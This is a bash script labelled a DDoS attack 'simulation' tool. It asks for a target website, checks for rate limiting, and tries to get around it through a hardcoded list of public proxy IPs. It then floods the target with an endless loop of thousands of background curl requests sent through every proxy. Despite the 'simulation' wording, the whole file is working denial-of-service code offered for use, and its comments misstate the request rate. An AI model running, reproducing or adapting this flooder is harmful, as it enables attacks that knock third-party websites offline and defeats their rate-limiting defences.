#!/bin/bash

echo "========================"
echo "Use it at your own Risk"
echo "Use it at your own Risk"
echo "Use it at your own Risk"
echo "========================"

# List of proxy servers
proxy_servers=("183.88.212.184:8080" "160.19.155.51:8080" "144.76.42.215:8118" "165.16.46.193:8080" "202.62.67.209:53281" "103.70.79.3:8080" "62.33.207.202:3128" "181.209.82.154:23500" "24.172.82.94:53281" "91.214.31.234:8080" "37.120.192.154:8080" "82.64.77.30:80" "51.15.242.202:8888" "120.29.124.131:8080" "103.165.218.234:8085" "202.5.36.152:5020" "200.7.118.62:666" "41.57.25.129:6060" "103.26.108.254:84" "202.154.18.133:8080" "103.91.82.177:8080" "66.27.58.70:8080" "103.26.110.134:84" "185.82.98.42:9092" "175.106.10.227:7878" "177.87.250.66:999" "103.255.147.102:82" "91.204.239.189:8080" "154.236.177.123:1976" "188.132.222.166:8080" "103.164.221.34:8080" "121.101.131.67:1111" "61.254.81.88:9000" "64.157.16.43:8080" "83.171.90.83:8080")

# Function to check for DDoS protection
check_ddos_protection() {
    echo "Checking for DDoS protection on target website: $target_url..."
    # Add your DDoS protection check logic here
    # For example, you could try sending a few requests and analyze the response
    # to determine if there are any rate limiting or captcha challenges.
    # For demonstration purposes, let's assume the server responds with a "429 Too Many Requests" status code
    response=$(curl -s -o /dev/null -w "%{http_code}" "$target_url")
    if [ "$response" == "429" ]; then
        echo "DDoS protection detected: Rate limiting in place."
        return 0
    else
        echo "No DDoS protection detected."
        return 1
    fi
}

# Function to bypass DDoS protection
bypass_ddos_protection() {
    echo "Attempting to bypass DDoS protection..."
    # Add your DDoS protection bypass logic here
    # This might involve rotating IP addresses, using different user agents, etc.
    # For demonstration purposes, let's assume rotating IP addresses
    for proxy in "${proxy_servers[@]}"; do
        response=$(curl -s -x "$proxy" -o /dev/null -w "%{http_code}" "$target_url")
        if [ "$response" != "429" ]; then
            echo "Bypass successful. Proxy server $proxy used."
            return
        fi
    done
    echo "Bypass unsuccessful. DDoS protection may still be in place."
}

# Function to perform DDoS Attack Simulation with IP rotation
simulate_ddos_attack_with_ip_rotation() {
    echo "Simulating DDoS Attack with IP rotation on target website: $target_url..."
    
    # Loop indefinitely to send HTTP requests continuously
    while true; do
        # Start time of the loop
        start_time=$(date +%s.%N)
        
        # Send 1000 requests per second
        for ((i = 0; i < 10000; i++)); do
            for proxy in "${proxy_servers[@]}"; do
                curl -s -x "$proxy" -o /dev/null "$target_url" &
            done
        done

        # End time of the loop
        end_time=$(date +%s.%N)

        # Calculate the duration of the loop
        duration=$(echo "$end_time - $start_time" | bc)

        # Calculate the sleep time to maintain 1000 requests per second
        sleep_time=$(echo "scale=3; 1 - $duration" | bc)

        # Sleep for the remaining time to achieve 1000 requests per second
        sleep "$sleep_time"

        echo "Sent 1000 requests. Press Ctrl+C to stop."
    done
}


# Main function
main() {
    echo "DDoS Attack Simulation with IP Rotation Tool"
    echo "--------------------------------------------"

    # Prompt user to enter target website link
    read -p "Enter your target website link: " target_url

    # Check for DDoS protection
    check_ddos_protection
    check_result=$?

    # Ask user if they want to attempt to bypass DDoS protection
    if [ $check_result -eq 0 ]; then
        read -p "Do you want to attempt to bypass DDoS protection? (yes/no): " bypass_choice
        if [[ "$bypass_choice" == "yes" ]]; then
            bypass_ddos_protection
        fi
    fi

    # Prompt user before initiating DDoS attack
    read -p "Do you want to run the DDoS attack simulation? (yes/no): " attack_choice
    if [[ "$attack_choice" == "yes" ]]; then
        simulate_ddos_attack_with_ip_rotation
    else
        echo "DDoS attack simulation canceled."
    fi
}

# Call main function
main
